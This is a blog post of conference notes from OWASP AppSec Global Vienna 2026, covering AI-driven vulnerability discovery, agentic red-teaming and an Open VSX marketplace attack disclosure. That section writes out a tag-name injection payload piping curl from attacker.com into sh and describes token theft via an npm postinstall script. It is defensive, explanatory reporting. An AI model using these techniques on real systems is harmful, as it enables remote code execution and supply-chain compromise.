@@ -1,0 +1,236 @@
+:PROPERTIES:
+:ID:       8DBBD7A9-31AD-465F-8451-363A49FB5476
+:END:
+#+title: OWASP AppSec Global Vienna 2026 — Notes from the Conference
+#+filetags: :security:owasp:conference:ai:appsec:
+#+author: Victor Dorneanu
+#+date: 2026-06-29
+#+setupfile: setup.org
+#+draft: true
+#+property: header-args :mkdirp yes
+
+Two days at OWASP AppSec Global EU in Vienna, 25–26 June 2026. The conference was 25 years old — and the
+field it covers has never moved faster. Almost every talk I attended circled the same central question: what
+does AI-speed vulnerability discovery mean for the way we build, test, and ship software? These are my notes.
+
+* The End of Mandatory Code Review?
+
+The Thursday keynote opened with a quote from Joseph Ruscio of Heavy Bit:
+
+#+begin_quote
+"The mistake would be to treat unread code as a failure of discipline rather than a signal that discipline
+itself must change."
+#+end_quote
+
+The argument: mandatory code review is not sustainable at the velocity and volume that AI-assisted development
+is producing. The bottleneck has moved. It used to be *writing* code — now it's *reading and reviewing* it.
+Enforcing discipline harder won't fix a structural mismatch.
+
+The talk proposed three pillars for enabling engineering organisations in the agentic era:
+
+- *Platform Teams* — paved roads, opinionated paths, secure-by-default provisioning
+- *SRE* — performance, resilience, production quality gatekeeping
+- *Agent Enablement* — a new function alongside the other two: context engineering, rules and standards for
+  agentic behaviour, token efficiency, internal tooling built for agents (not just humans), and education
+
+That third pillar is the one I hadn't seen formalised before. "Context engineering" as a first-class job
+function in a security team is a genuinely new idea.
+
+* Agentic Red-Teaming Is Not LLM Red-Teaming
+
+The Fujitsu Research of Europe talk (Amit Giloni, Roy Betser, Roman Vainshtein) drew a sharp distinction that I
+think is underappreciated: testing a model in isolation (prompt → response) is fundamentally different from
+testing an agentic system.
+
+When an agent orchestrates memory, tools, external services, and other agents — the attack surface is the
+*whole system*, not the LLM. Their five-stage pipeline makes this concrete:
+
+1. *System Understanding* — map agents, tools, and memory before touching anything
+2. *Safe Execution* — sandbox and emulate tools so testing doesn't cause real-world damage
+3. *Runtime Observability* — trace the internal path; the trace is the evidence
+4. *System-Specific Attack Generation* — adapt one attack idea into many executable instances
+5. *Impact Measurement* — evaluate at the system level (what did the agent actually *do*?), not by reading
+   the LLM's output text
+
+Steps 1–3 are prerequisites. You can't do meaningful attack generation without first understanding the system
+and being able to run it safely with full observability. That ordering matters more than any individual
+technique.
+
+* The Map of Artificial Treasures
+
+A talk I found practically useful: using GenAI and MCP for continuous threat modeling. The core idea is wiring
+threat modeling into the CI/CD pipeline so it runs alongside development — pre-commit hooks for staged changes,
+pre-push for full audits, CI build for whole-codebase passes.
+
+The architecture chains together: AI chat / IDE → Threat Modeling MCP Server → Threat Modeling Tool (stores
+history). Downstream, the threat model feeds vulnerability triage, IaC policy generation, and attack-path
+detection against real cloud assets.
+
+Honest about the tradeoffs too: non-deterministic output, context limitations, IP leakage risk to LLM
+providers. Worth reading the source repo: [[https://github.com/SureFireIO-GmbH/security-skills][SureFireIO-GmbH/security-skills]].
+
+* The AI Vulnerability Storm
+
+The Friday keynote was the most unsettling session of the conference — in the right way. It presented a timeline:
+
+| Date           | Event                                                                                     |
+|----------------+-------------------------------------------------------------------------------------------|
+| Jun 2025       | XBOW tops HackerOne leaderboard — first autonomous system to outperform all human hackers |
+| Aug 2025       | Google Big Sleep finds 20 zero-days in FFmpeg, ImageMagick autonomously                   |
+| Aug 2025       | DARPA AIxCC: AI found 54 vulns across 54M lines of code in 4 hours                       |
+| Sep 2025       | Heather Adkins + Gadi Evron publish singularity warning — ~6 months away                  |
+| Nov 2025       | First AI-orchestrated espionage campaign: Chinese state actor, ~30 global targets         |
+| Feb 2026       | 500+ high-severity OSS vulns from Claude Opus 4.6; 12 OpenSSL zero-days by AJSLE         |
+| Mar 2026       | OSS projects overwhelmed — Linux kernel bug reports up 5×; curl seeing quality AI reports |
+| Apr 2026       | Claude Mythos: thousands of zero-days across major OSes, 72% exploit success rate         |
+
+The Zero Day Clock is the most visceral data point: mean time from disclosure to exploitation was 2.3 years
+in 2019. In 2026 it's under one day.
+
+*Claude Mythos* (Anthropic, April 2026) is restricted-access via Project Glasswing — defensive partners only.
+It chains complex multi-step vulnerabilities that previous models couldn't find, autonomously, without human
+guidance. The CSA briefing written in response ("The AI Vulnerability Storm: Building a Mythos-ready Security
+Program") was produced in a single weekend with 60+ named contributors and reviewed by 250+ CISOs.
+
+The central recommendation from that briefing: build *VulnOps* as a permanent organisational capability —
+continuous AI-speed discovery and patching — not a temporary incident response function.
+
+The SANS 6-step AI-assisted pentest methodology sketched in the briefing:
+
+1. Codebase mapping — AI generates function and workflow summaries
+2. High-value targeting — auth flows, input validation, OAuth
+3. Progressive narrowing — iterative prompting across large codebases
+4. Test harness construction — extract vulnerable code, build local env
+5. Exploitation & validation — AI creates and proves exploits
+6. Human-verified reporting — professionals review all findings
+
+** Anthropic's Reference Harness
+
+Worth calling out separately: Anthropic published [[https://github.com/anthropics/defending-code-reference-harness][defending-code-reference-harness]], a six-stage find-and-fix loop
+that anyone can run on their own codebase. The six stages:
+
+1. Threat Model → 2. Sandbox → 3. Discovery → 4. Verification → 5. Triage → 6. Patching
+
+Key design insight: discovery and verification must be *separate agents*. Single-pass agents self-censor —
+they find a potential vulnerability and then talk themselves out of reporting it. Using a fresh agent to
+disprove the finding, plus multi-vote across multiple verifiers, cuts the false-positive rate dramatically.
+PoC execution in a sandbox brings it to near zero.
+
+As of late May 2026, Anthropic's own OSS scanning had disclosed 1,596 vulnerabilities — 97 patched. Discovery
+is now the easy part. Verification and patching are the bottleneck.
+
+* Mythos or Myth — Panel Notes
+
+The panel consensus that stuck with me: *AI should fix the existing mess, not add to it.* The priority is
+remediation of known-bad code — using AI to ship faster while compounding underlying security debt is the wrong
+order of operations.
+
+The Berkeley Vulnerability Initiative ([[https://vuln.cs.berkeley.edu/][vuln.cs.berkeley.edu]]) put numbers to the scale. From their live dashboard
+(Mar 27 – Jun 25, 2026 vs same window 2025):
+
+- Total CVEs up *+61%* year-on-year
+- 382 verified AI-discovered CVEs in the window
+- AI-discovered CVEs rated high/critical: *60.4%* (vs 44.8% in 2025)
+- Top CWE categories: OS Command Injection, Missing Auth for Critical Function, Code Injection, Path Traversal,
+  Deserialization, SQL Injection
+
+One buried finding: among AI-discovered CVEs, CVSS score has *lost its meaningful relationship to actual exploit
+risk*. Traditional severity scoring is no longer a reliable triage signal in this regime.
+
+** The Nano-Analyzer Surprise
+
+Jaya Baloo mentioned someone reproduced Mythos-level findings using GPT nano — a tiny, cheap model. This is the
+"System Over Model" paper by AISLE: [[https://github.com/weareaisle/nano-analyzer][nano-analyzer on GitHub]].
+
+The thesis: scaffolding does the work, not model size. A deliberately simple, embarrassingly parallel one-file
+scanner — no agentic loop — pointed at the full FreeBSD and OpenBSD kernels detected CVE-2026-4747 (Mythos's
+flagship FreeBSD RPC stack overflow) with models as small as *3.6B active parameters*. Full scan cost: ~$12 on
+OpenRouter, free with local inference.
+
+Three stages:
+1. Context briefing — map attack surface per file
+2. Vulnerability scan — five analytical questions with few-shot examples
+3. Multi-round triage — three validation rounds + arbiter decision
+
+A reachability filter cut false positives from 30 → 5 while preserving the real CVE.
+
+The implication is uncomfortable for the "only frontier models matter" narrative: pipeline architecture and
+system design matter more than raw model capability for vulnerability discovery.
+
+** A New Attack Vector: Malicious Patches
+
+The panel flagged something I hadn't fully considered: AI-generated vulnerability reports sometimes carry
+malicious code in the suggested fix. The report is legitimate — the bug is real — but the patch contains a
+backdoor. Maintainers must now review patches as carefully as the bugs themselves, possibly more so. This is
+supply chain compromise delivered via the bug report channel.
+
+* Marketplace Takeover: Open VSX
+
+The most technically dense talk was the Open VSX attack chain disclosure. Open VSX is the extension marketplace
+for all non-Microsoft VS Code forks — Cursor (10M+ users), StackBlitz/Bolt (7M+), Gitpod, Windsurf,
+code-server, Arduino IDE 2.x, VSCodium, GitLab Web IDE, GCP Cloud Shell, and more.
+
+Three distinct attack chains were presented:
+
+** Chain 1: Tag Name → RCE
+
+Open VSX's nightly =publish-extensions= job reads an extension's latest GitHub release tag and feeds it
+*unsanitized* into =git reset --hard ${ref}=, executed via =/bin/bash=. A malicious tag name like
+=$(curl${IFS}attacker.com|sh)= becomes code execution in the CI runner — which holds a =GITHUB_TOKEN= with
+=actions: write= and can dispatch the publish workflow (which holds =OVSX_PAT=). From there, any extension on
+open-vsx.org can be overwritten.
+
+** Chain 2: Flood and Slip
+
+The malware scanner has no rate limit protection. Flooding the publish endpoint exhausts the DB pool, causing
+=enqueue()= to throw. =enqueuedCount = 0= returns =false= — and the extension activates without being scanned.
+The scanner reports =PASSED ✓= because it never ran.
+
+** Chain 3: npm postinstall Steals the Keys
+
+#+begin_src bash
+OVSX_PAT=<super-admin> npm install
+#+end_src
+
+The nightly CI runs =npm install= with the super-admin PAT sitting in the environment. =npm install= runs
+arbitrary lifecycle scripts from every dependency. Slip a malicious =postinstall= into =extensions.json=,
+exfiltrate the token, overwrite any extension. 20M+ machines pull a silent malicious update on the next
+sync.
+
+The pattern across all three: trust broke at every layer. Untrusted code ran next to privileged credentials.
+Errors were treated as "nothing to do" rather than failures. And IDEs recommended extensions by name
+without verifying identity.
+
+* The TPM and You
+
+The conference closed out (for me) with a primer on Trusted Platform Modules from SBA Research. The opening
+slide had a photo of Mark Twain with the caption: "Every problem in cryptography can be reduced to a key
+management problem — Abraham Lincoln."
+
+The central concept worth remembering: all TPM cryptographic keys are organised in a *hierarchy* (a tree),
+where each key is encrypted by its parent. Each Primary Key is derived from a fixed, persistent seed (stored
+in NVDATA) via a KDF, plus a template. The tree extends from there — K1, K2… — each encrypted under their
+parent's public key.
+
+The TPM is hardware's answer to the key management problem the fake Lincoln quote describes. Worth digging
+into further: "A Practical Guide to TPM 2.0" (the book), Matthew Garrett's blog, and the Go sample repo
+linked from the talk slides.
+
+* Themes Across Two Days
+
+Looking back at all the sessions, three ideas recur:
+
+1. *The attack surface is the system, not the model.* Whether you're testing agentic AI or building threat
+   models, the interesting action happens at the integration points — memory, tools, APIs, CI runners, package
+   managers — not inside the LLM.
+
+2. *Discovery is solved; verification and patching are the bottleneck.* The field has collectively cracked
+   automated vulnerability discovery. 1,596 vulns found, 97 patched — that ratio is the current challenge.
+   VulnOps as a permanent team function is the right organisational response.
+
+3. *Pipeline architecture beats model size.* Nano-analyzer, the Anthropic harness, Fujitsu's red-teaming
+   pipeline — the papers and talks that showed real results all prioritised how the system is structured over
+   which model it calls. This pattern will only become more pronounced as capable small models get cheaper.
+
+The conference schedule and talk recordings (when available) are at [[https://owaspglobalappseceuvienna20.sched.com/list/simple][owaspglobalappseceuvienna20.sched.com]].
+OWASP YouTube channel: [[https://www.youtube.com/@OWASP][@OWASP]] — videos typically appear 2–6 weeks after the event.
